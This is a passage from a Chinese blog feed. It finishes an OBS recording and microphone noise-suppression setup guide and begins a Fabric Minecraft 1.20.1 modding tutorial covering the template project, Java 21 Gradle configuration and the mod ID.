        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><blockquote><p>平台：Windows11 pro 23H2<br>OBS 版本：31.0.3 (64bit)<br><code>OBS</code> 全称为 <code>Open Broadcaster Software</code>，以下简称为 <code>OBS</code>。<br>它是一个开源免费的视频录制和直播软件，您可以在 Windows、Mac 或 Linux 上快速轻松地下载并开始直播或是录制视频。</p></blockquote><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><p>官网下载地址：<a href="https://obsproject.com/download">https://obsproject.com/download</a></p><p>你也可以使用 Steam 安装，商店地址为：<a href="https://store.steampowered.com/app/1905180/OBS_Studio/">https://store.steampowered.com/app/1905180/OBS_Studio/</a></p><h2 id="录制视频方案"><a class="markdownIt-Anchor" href="#录制视频方案"></a> 录制视频方案</h2><p>由于我暂时还在使用 1k 显示器，所以对于传统的 <code>1920x1080</code> 分辨率，我新建配置文件并命名为 <code>16:9录制</code>。</p><p>在此场景源中新增三个采集源，即游戏采集、窗口采集、显示器采集；混音器新增麦克风采集。</p><p>点击左上角文件转到设置界面，左侧边栏选择<strong>输出</strong>，并将<strong>输出模式</strong>改为<strong>高级</strong>。现在，你将可以设置四个项目：</p><ol><li>直播</li><li>录制</li><li>音频</li><li>回放缓存</li></ol><p>直播的画质设置基本同录制视频一致，所以此处将介绍<strong>录制</strong>项目的具体配置。</p><h3 id="录制"><a class="markdownIt-Anchor" href="#录制"></a> 录制</h3><p>在录制选项中，将类型改为<strong>标准</strong>，并以下图为参考进行设置：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181239464.png" alt="image-20250718123921347"></p><p><strong>录像格式</strong>，推荐采用 <code>Matroska(.mkv)</code> 格式，此格式录制的视频在突然断电或者其他问题导致录制视频受损时可以被抢救。</p><blockquote><p>另，如果你想将视频发送给朋友进行分享，朋友的视频播放器可能会不支持<code>.mkv</code> 解析，那么你只需要利用 OBS 自带的<code>录像转封装</code>功能 (点击左上角的文件 =&gt; 录像装封装)，将<code>.mkv</code> 转换成<code>.mp4</code> 就好（导入 Pr 进行视频剪辑同样需要转封装为<code>.mp4</code>）。<br>转换封装（只转换封装不进行转码）一般不会损害画面信息，因为只是转换了视频容器，这个过程就像是将物品从一个盒子放到另一个盒子一样非常快；而转码则是指<strong>重新压缩和编码视频内容</strong>，例如将 H.264 编码的视频转为 H.265。这相当于 “重新包装物品”，不仅改变外壳，还会对内部内容进行处理。<br>如果你只想进行视频剪辑而不需要转码（Pr 导出视频往往会将视频重新转码），推荐使用免费的 <a href="https://www.shutterencoder.com/">Shutter Encoder</a>：<a href="https://www.shutterencoder.com/">Shutter Encoder</a> 是一款 <strong>免费、开源、专业级的视频处理工具</strong>，由法国剪辑师 Paul Pacifico 开发。它界面简洁，功能强大，适用于 <strong>视频封装转换、剪辑、压缩、格式转换、音频提取</strong> 等多种操作，非常适合创作者在<strong>不进行转码</strong>的情况下快速处理素材。</p></blockquote><p><strong>视频编码器</strong>，推荐选择 <code>NVIDIA NVENC H.264</code>，这将优先使用显卡进行视频编码，并且格式为兼容性极高的 <code>H.264</code>。相对的，会有一个 <code>x264</code> 选项，此为 CPU 编码，若显卡功能足够，则不推荐选择。</p><p><strong>音轨</strong>，推荐勾选 <code>1、2、3</code> 音轨，用以支持麦克风、电脑音频分开录制，方便后期处理。多出来的一条轨道是用来将两个音频混在一起，这对预览视频帮助很大，你也不想预览视频的时候只能一条条轨道切换着听吧？</p><p><strong>重新缩放</strong>输出为禁用；<strong>自定义混流器</strong>设置一般不用，留空；<strong>自动分割文件</strong>，看个人喜好。</p><p><strong>比特率控制</strong>，我推荐为 <code>CBR</code>。</p><blockquote><p><strong>比特率俗称码率，值越高视频承载的画面信息往往越多</strong>。</p></blockquote><p>此处的控制方式（根据选择的视频编码器的不同，此处比特率控制的选项也有不同，推荐选择的视频编码器为 <code>NVIDIA NVENC H.264</code>）有：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181257062.png" alt="image-20250718125704031"></p><ol><li><strong>恒定比特率（CBR）</strong>：顾名思义，录制视频时，<strong>比特率将始终保持在设定的值上</strong>（理想情况下），即使画面很简单也不会降低码率。虽便于直播，但简单画面也会占用同样的码率，如果录制的画面较为简单，请降低比特率的值，比如 4000 左右（你可以将 4000 码率简单的理解为直播平台的蓝光 4M）。</li><li><strong>恒定（QP）</strong>：采用 QP（Quantization Parameter）将会让你设定 QP 的值，该值控制的是压缩强度。<strong>值越低，画质越好，但文件也越大；数值越高，画质越差，文件越小</strong>。<strong>视频质量在全程保持一致</strong>，而文件大小（码率）会根据内容复杂度波动。这也使得你无法预估它产生的文件大小，不适合直播。若硬盘容量不足，请谨慎使用。</li><li><strong>可变比特率（VBR）</strong>：采用此项，将会让你设定<strong>目标比特率值</strong>和<strong>最大比特率值</strong>。录制视频时，比特率将视当前采集画面的内容复杂度来决定比特率的值的高低。即画面越复杂，比特率越高；画面越简单，比特率越低（但一般不会低于所设定的目标比特率值）。这样录制出来的视频体积较小，但复杂画面情况下，可能会因为码率分配不足导致画质变差。</li><li><strong>具有目标质量的可变比特率（CQVBR）</strong>：编码器采用 <code>NVIDIA NVENC H.264</code> 则此处算法为 <code>CQ</code>，若选择的视频编码器为 CPU 编码的 <code>x264</code>，则此处算法为 <code>CRF</code>。采用此项，将会让你设定目标质量的值，这是<strong>基于画质优先的可变比特率</strong>，与 VBR 不同，它设定的是 “画质等级”，而不是码率。编码器将自动调整码率以保持目标画质。常见数值（如 NVENC CQ = 15-25，x264 CRF = 18-23），数值越小画质越高。同样的，这样的录制方式，文件大小不可控，不适合直播。</li><li><strong>无损</strong>：保留原汁原味的画面信息，不对画面使用任何有损压缩方法。但产生的文件极大，不适合直播。</li></ol><p>至于比特率下面的预设内容，需要根据你的显卡能力决定，我的显卡为 <code>RTX 4070</code> 仅供参考。</p><h3 id="画布"><a class="markdownIt-Anchor" href="#画布"></a> 画布</h3><p>画布的大小决定了最终的视频分辨率。此项，在设置的左侧边栏的视频中，设置时请注意基础画布和输出的差别即可：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181341742.png" alt="image-20250718134153700"></p><p>基础画布分辨率往往是你的显示器分辨率，而输出分辨率则决定了录制的视频最终效果，比如 2k 显示器录制 1k 内容，则需要将输出分辨率进行更改，并且选择缩小算法为 <code>Lanczos（锐化缩放，36个样本）</code>。</p><p>帧率就是视频的帧率啦，这很简单。</p><h3 id="高级"><a class="markdownIt-Anchor" href="#高级"></a> 高级</h3><p>在左侧边栏的高级选项中，你可能还需要确认一下视频的相关信息：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181345779.png" alt="image-20250718134519745"></p><p><strong>色彩格式</strong>，因为视频可能需要上传到网络平台，所以出于兼容性的考虑，推荐选择 <code>NV12（8位）</code>。<strong>色彩空间</strong>也是同理，当然你也可以选择为 <code>SRGB</code>，这和 <code>Rec.709</code> 相差很小，往往能转换。</p><p>特别的，如果你觉得每次都要手动转换封装很烦，那么也可以勾选上录制里面的<strong>自动封装至 mp4 格式</strong>。</p><h2 id="混音器"><a class="markdownIt-Anchor" href="#混音器"></a> 混音器</h2><p>前面我们设置了视频的音轨为 3 轨道，所以还需要在混音器中将 3 轨道勾选上：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181351792.png" alt="image-20250718135136741"></p><p>找到一个音频表，点击选项图标再找到高级音频设置即可。按如图所示将轨道勾选，音轨 1 为混音轨道，麦克风和电脑音频将一起输出在这个轨道，这之后轨道 2 和轨道 3 分别勾选好就行，麦克风和电脑音频独占一条轨道。</p><h2 id="麦克风降噪"><a class="markdownIt-Anchor" href="#麦克风降噪"></a> 麦克风降噪</h2><p>由于我暂时使用的是电容式麦克风，往往会收音到环境噪音，所以给麦克风进行降噪是必须的。</p><p>我的方案是：<code>Equalizer APO</code>+<code>Real-time Noise Suppression Plugin</code></p><h3 id="noise-suppression"><a class="markdownIt-Anchor" href="#noise-suppression"></a> Noise Suppression</h3><p>下载地址：<a href="https://github.com/werman/noise-suppression-for-voice/releases">Noise Suppression GitHub Releases</a></p><blockquote><p>A real-time noise suppression plugin for voice based on <a href="https://github.com/xiph/rnnoise">Xiph's RNNoise</a>. <a href="https://people.xiph.org/~jm/demo/rnnoise/">More info about the base library</a>.<br>基于 Xiph's RNNoise 的实时语音降噪插件。有关基础库的更多信息。</p><p>The plugin is meant to suppress a wide range of noise origins (<a href="https://arxiv.org/pdf/1709.08243.pdf">from original paper</a>): computer fans, office, crowd, airplane, car, train, construction.<br>该插件旨在抑制多种噪声来源（根据原始论文）：电脑风扇、办公室、人群、飞机、汽车、火车、建筑工地。</p><p>From my tests mild background noise is always suppressed, loud sounds, like clicking of mechanical keyboard, are suppressed while there is no voice however they are only reduced in volume when voice is present.<br>根据我的测试，轻微的背景噪声总是会被抑制，而像机械键盘点击声这样的大声响，在无语音时会被抑制，但有语音时只会降低音量。</p><p>Please note that this plugin could not improve the voice quality with bad microphone, it even could make things worse by misclassifying the voice as a noise which would reduce already not-so-good voice quality.<br>请注意，该插件无法改善劣质麦克风的语音质量，甚至可能通过将语音误分类为噪声而使情况变得更糟，从而降低已经不算好的语音质量。</p><p>The plugin works with one or more channels, 16 bit, 48000 Hz audio input.<br>该插件适用于一个或多个通道、16 位、48000 赫兹的音频输入。</p><p>❗ ❗ ❗ Do NOT use any other sample rates, use ONLY 48000 Hz, make sure your audio source is 48000 Hz and force it to be 48000 Hz if it is not.<br>❗ ❗ ❗ 请勿使用任何其他采样率，仅使用 48000 Hz，确保您的音频源为 48000 Hz，如果不是，强制将其设置为 48000 Hz。</p></blockquote><p>你需要下载该插件保存到本地备用。</p><h3 id="equalizer-apo"><a class="markdownIt-Anchor" href="#equalizer-apo"></a> Equalizer APO</h3><blockquote><p>参考视频：<a href="https://www.bilibili.com/video/BV1e84y1R7un">你是否也遇到了麦克风声音小底噪大的问题</a></p></blockquote><p>下载地址：<a href="https://sourceforge.net/projects/equalizerapo/">SourceForge</a> 或者 <a href="https://equalizerapo.com/download.html">https://equalizerapo.com/download.html</a></p><blockquote><p><strong>SourceForge</strong>：<strong>Equalizer APO</strong> 是一款运行在 Windows（Vista 及以上版本）的系统级音频处理框架，采用 <strong>Audio Processing Object (APO)</strong> 架构。它可以对任意音频输出进行实时均衡、增强、应用音频效果，具有极低延迟和系统资源占用（CPU 占用率很低）</p></blockquote><p>安装时，会有一个这样的界面：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181437636.png" alt="image-20250718142405779"></p><p>也就是默认在安装时就进行安装 APO，你也可以点击 Cancel 取消安装，也可以在此时就进行安装。如果现在进行安装，那么由于我们是给麦克风降噪，所以这里选择 <code>Capture devices</code> 而<strong>不是</strong><code>Playback devices</code>，再勾选你想进行降噪的麦克风即可。之后一路下一步完成安装。</p><p>这个软件是需要进行一定配置的。不过，首先我们需要转到系统设置中，对播放、录制设备进行格式统一：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181419088.png" alt="image-20250718141948034"></p><p>把播放、录制设备的格式参数都统一成 <strong>24 位 48000 HZ</strong> 这个参数。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181421889.png" alt="image-20250718142147852"></p><p><strong>别忘记保存你的设置。</strong></p><p>接着打开 <code>Equalizer APO Configuration Editor</code>（在软件安装目录中是 <code>Editor.exe</code>），会弹出一个对话框：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181416876.png" alt="image-20250718141640846"></p><p>这是正常的，如果你前面在安装时没有安装 APO，这里就会弹出来这个对话框（有时候安装好了也会弹，不知道为啥）。对话框表示你现在没有在任何播放、录制设备上安装 APO。<br>如果你前面没有进行安装，那么我们点击 Yes，开始安装 APO 到设备上，安装步骤和前面一致（可能需要重启电脑）。</p><p>已经安装过了，所以我们选择 No。接着在工具栏中选择你的设备为你想要的麦克风：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181440995.png" alt="image-20250718144024925"></p><p>接着将 <code>config.txt</code> 中的默认配置点击减号 <code>-</code> 全部去掉：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181442503.png" alt="image-20250718144205459"></p><p>接着点击工具栏中的空白文档图标，创建一个新的配置文件：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181443772.png" alt="image-20250718144348736"></p><p>然后在这个 Unsaved 新的配置文件中点击加号 <code>+</code>，选择 <code>Control</code>，再选择 Device：<img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181446086.png" alt="image-20250718144638045"></p><p>接着将设备改为你需要进行降噪的麦克风：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181449734.png" alt="image-20250718144904697"></p><p>接着再点击加号选择 <code>Plugins</code> 选择 <code>VST Plugin</code><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181452724.png" alt="image-20250718145259692"></p><p>此时，加载 <code>rnnoise_mono.dll</code> 还是 <code>rnnoise_stereo.dll</code> 就看 Channel 是怎么选的了：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181455234.png" alt="image-20250718145516198"></p><p>加载好插件之后，特别的，你可以点击 <code>Open panel</code> 打开该插件的设置面板：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181456173.png" alt="image-20250718145650131"></p><p>我的设置如上。</p><p>接着需要将配置文件进行保存。点击工具栏的 Save 图标为配置文件命名进行保存：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181458964.png" alt="image-20250718145836927"></p><p>然后回到 <code>config.txt</code> 配置文件，对我们刚才保存的配置文件进行包含：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181459361.png" alt="image-20250718145959329"><br>得到下面的样子：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181500554.png" alt="image-20250718150026514"></p><p>至此，该软件就配置完成了。这个效果是全局生效的，即使你关闭该软件依然会生效。</p><h3 id="obs-滤镜"><a class="markdownIt-Anchor" href="#obs-滤镜"></a> OBS 滤镜</h3><blockquote><p>参考视频：<a href="https://www.bilibili.com/video/BV16vZNYqEot">【OBS 教程】添加 8 个音频滤镜 让声音清晰洪亮</a></p></blockquote><p>我知道你肯定想问，如果 OBS 能添加 VST 插件，那为什么还需要使用 <code>Equalizer APO</code> 呢？确实，但这只是生效于 OBS 录制的麦克风中，但其他软件的视频通话、语音时并不会生效，使用 <code>Equalizer APO</code> 就是图它这个全局效果。</p><p>承接上面的配置完成之后，在混音器中点击麦克风的设置菜单，选择滤镜。添加滤镜如图：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181356550.png" alt="image-20250718135628505" style="zoom: 33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181514694.png" alt="image-20250718151453650" style="zoom:33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181515605.png" alt="image-20250718151507551" style="zoom:33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181515109.png" alt="image-20250718151520061" style="zoom:33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181515385.png" alt="image-20250718151533326" style="zoom:33%;"></p><div class="note warning flat"><p><strong>OBS 滤镜的执行是有顺序的，请注意，滤镜将会从上到下依次执行。</strong></p></div><p>其中，各个滤镜的作用是：</p><ol><li><strong>噪声门限</strong>：用于隔绝低于关闭阈值的声音，只收音到打开阈值的声音分贝。此项主要是处理键盘声和其他细微的声音。</li><li><strong>向上压缩器</strong>：用于提升小声说话时的声音分贝值，将小声说话时的分贝值拉升到平常说话分贝值。所以，此项需要在噪声门限的下面一级，否则将会把环境噪音也拉升。</li><li><strong>3 段式均衡器</strong>：用于调整声音频段分贝。压低高频分贝，将有效降低声音空间感；压低中频分贝，将降低声音的鼻音不会很闷；压低低频分贝，将一定程度上使声音变得很轻。</li><li><strong>压缩器</strong>：防止一瞬间录到的声音爆麦，将音频进行消音，处理较为平滑。</li><li><strong>限幅</strong>：和压缩器作用一致，但更强硬。</li></ol><p>至此，我的全部设置基本讲解完毕。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 我的方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OBS </tag>
            
            <tag> VST </tag>
            
            <tag> Noise Suppression </tag>
            
            <tag> Equalizer APO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fabric 模组开发 - Minecraft1.20.1：#1. 初始化工作区布置</title>
      <link href="/posts/21458.html"/>
      <url>/posts/21458.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p><s>我重生了，上一世我没能坚持学习 Fabric Modding 导致未能幸存，这一世我要拿回属于我的一切😤</s></p><p>一直以来想学着做一个 mod 供自己玩，于是在此记录学习过程，鞭策自己学下去。</p><blockquote><p>平台：Windows11<br>Java 版本：Java 21<br>Minecraft 版本：1.20.1<br>Git 版本：git version 2.50.1.windows.1<br>IDE：IntelliJ IDEA Community Edition 2025.1.3（以下将简称为 IDEA）</p></blockquote><h2 id="fabric模板项目"><a class="markdownIt-Anchor" href="#fabric模板项目"></a> Fabric 模板项目</h2><p>推荐使用 Fabric 官方提供的模板项目开始学习。你可以<a href="https://fabricmc.net/develop/template/">点击</a>进行跳转：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231742309.png" alt="image-20250723174244140"></p><p>Minecraft 版本为 1.20.1 并且在高级选项中，将 <code>Data Generation</code> 勾选上，取消勾选 <code>Split client and common sources</code>。<code>Data Generation</code> 能让我们可以构建合成配方等资源，取消勾选拆分客户端和服务端代码是因为，初学者基本搞不清哪部分是服务器端代码哪部分是客户端代码，之后我们将手动进行拆解。</p><p>下载下来将压缩包解压，将目录中的 <code>LICENSE</code> 和<code>.github</code> 删除（前者为文件，后者为文件夹）。接着我们用 IDEA 将其作为工程项目打开。</p><h2 id="项目配置"><a class="markdownIt-Anchor" href="#项目配置"></a> 项目配置</h2><p>在使用 IDEA 将项目打开之后，优先检查以下设置：</p><ol><li>项目结构：将 SDK 设置为受支持的版本，现在 Fabric 模板项目部分依赖已经要求 SDK 为 21 所以我们选择为 21<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231800157.png" alt="image-20250723180039128"></li><li>IDEA 设置：将 Gradle 用户主目录从 C 盘更改到其他你喜欢的路径，并检查 Gradle 使用的 JVM 版本是否为 SDK 21<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231802505.png" alt="image-20250723180235470"></li></ol><p>都确认无误之后，别忘记点击应用并确定更改。</p><p>在打开项目，配置设置的这段时间，IDEA 会自动触发 gradle 下载依赖，构建速度取决于你的网络链接状态。构建完成时，你将会在日志输出界面看到 <code>BUILD SUCCESSFUL</code> 的字样：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231805501.png" alt="image-20250723180551406"></p><p>若你的 SDK 为 java 17 或其他版本，你可能会在构建的时候遇到下面的报错：</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">A</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">problem</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">occurred</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">configuring</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">root</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">project</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'tutorial-mod-template-1.20.1'.</span></span><span class="line"><span style="color: #D4D4D4">&gt; Could not resolve all artifacts </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4"> configuration </span><span style="color: #CE9178">'classpath'</span><span style="color: #D4D4D4">.</span></span><span class="line"><span style="color: #D4D4D4">   &gt; </span><span style="color: #DCDCAA">Could</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">not</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">resolve</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">net.fabricmc:fabric-loom:1.11-SNAPSHOT.</span></span><span class="line"><span style="color: #D4D4D4">     </span><span style="color: #DCDCAA">Required</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">by:</span></span><span class="line"><span style="color: #D4D4D4">         </span><span style="color: #DCDCAA">root</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">project</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">:</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #CE9178">fabric-loom:fabric-loom.gradle.plugin:1.11-SNAPSHOT:20250708.081131-4</span></span><span class="line"><span style="color: #D4D4D4">      &gt; </span><span style="color: #DCDCAA">Dependency</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">requires</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">at</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">least</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">JVM</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">runtime</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">version</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">21</span><span style="color: #CE9178">.</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">This</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">build</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">uses</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">a</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Java</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">17</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">JVM.</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">* Try:</span></span><span class="line"><span style="color: #D4D4D4">&gt; Run this build using a Java 21 or newer JVM.</span></span><span class="line"><span style="color: #D4D4D4">&gt; Run with --stacktrace option to get the stack trace.</span></span><span class="line"><span style="color: #D4D4D4">&gt; Run with --info or --debug option to get more log output.</span></span><span class="line"><span style="color: #D4D4D4">&gt; Run with --scan to get full insights.</span></span><span class="line"><span style="color: #D4D4D4">&gt; Get more help at https://help.gradle.org.</span></span></code></pre></div></div></figure><p>该报错的原因是 <code>fabric-loom</code> 插件版本内部依赖了 Java 21+ 的功能或库，你可以在 <code>build.gradle</code> 和 <code>gradle.properties</code> 中找到相关的 <code>fabric-loom</code> 版本说明：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">// build.gradle</span></span><span class="line"><span style="color: #D4D4D4">plugins {</span></span><span class="line"><span style="color: #D4D4D4">id 'fabric-loom' version "${loom_version}"</span></span><span class="line"><span style="color: #D4D4D4">id 'maven-publish'</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">//gradle.properties</span></span><span class="line"><span style="color: #D4D4D4">minecraft_version=1.20.1</span></span><span class="line"><span style="color: #D4D4D4">yarn_mappings=1.20.1+build.10</span></span><span class="line"><span style="color: #D4D4D4">loader_version=0.16.14</span></span><span class="line"><span style="color: #D4D4D4">loom_version=1.11-SNAPSHOT</span></span></code></pre></div></div></figure><p>为什么要使用该版本？<a href="https://fabricmc.net/develop/">Fabric 文档</a>是这么写的…</p><blockquote><p>The recommended loom version is <strong>1.11-SNAPSHOT</strong>. This is usually defined near the top of your build.gradle file.<br>推荐的 loom 版本是 1.11-SNAPSHOT。这通常定义在您的 build.gradle 文件顶部附近。</p></blockquote><p>既然使用 Java21 了，相对应的也把 <code>build.gradle</code> 里面的相关配置项也修改为对应的版本：</p><figure class="shiki diff"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">java {</span></span><span class="line"><span style="color: #D4D4D4">     withSourcesJar()</span></span><span class="line"></span><span class="line"><span style="color: #CE9178">-    sourceCompatibility = JavaVersion.VERSION_17</span></span><span class="line"><span style="color: #CE9178">-    targetCompatibility = JavaVersion.VERSION_17</span></span><span class="line"><span style="color: #B5CEA8">+    sourceCompatibility = JavaVersion.VERSION_21</span></span><span class="line"><span style="color: #B5CEA8">+    targetCompatibility = JavaVersion.VERSION_21</span></span><span class="line"><span style="color: #D4D4D4"> }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4"> tasks.withType(JavaCompile).configureEach {</span></span><span class="line"><span style="color: #CE9178">-    it.options.release = 17</span></span><span class="line"><span style="color: #B5CEA8">+    it.options.release = 21</span></span><span class="line"><span style="color: #D4D4D4"> }</span></span></code></pre></div></div></figure><p>好了。接着，在项目视图的选项中，将平展相关选项取消勾选，这将使得 IDEA 不再将 <code>com.frozen.tutorialmod</code> 下的 <code>mixin</code> 文件夹显示为 <code>com.frozen.tutorialmod.mixin</code> 格式，方便我们掌握目录层级情况。<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231810163.png" alt="image-20250723181055120"></p><h2 id="mod-id"><a class="markdownIt-Anchor" href="#mod-id"></a> Mod ID</h2><blockquote><p>mod 的 id 是该 mod 的唯一标识，且该 id <strong>只能为数字 <code>0-9</code>、小写字母 <code>a-z</code>、下划线<code>_</code>和短横线 <code>-</code> 组成的字符串</strong>。</p></blockquote><p>在 <code>java/com/frozen/tutorialmod/TutorialMod.java</code> 中，检查是否已经将 Mod 的 id 进行引入：</p><figure class="shiki java"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">TutorialMod</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">implements</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">ModInitializer</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">static</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">final</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">String</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">MOD_ID</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"tutorial-mod"</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 关键语句</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">static</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">final</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Logger</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">LOGGER</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">LoggerFactory</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getLogger</span><span style="color: #D4D4D4">(MOD_ID);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">@</span><span style="color: #4EC9B0">Override</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">void</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">onInitialize</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">LOGGER</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">info</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello Fabric world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p><strong>此 ID 将在后面的开发过程中多次引用，所以这一步骤十分重要。</strong></p><p>接着，在 <code>resources/fabric.mod.json</code> 文件中，查看 ID 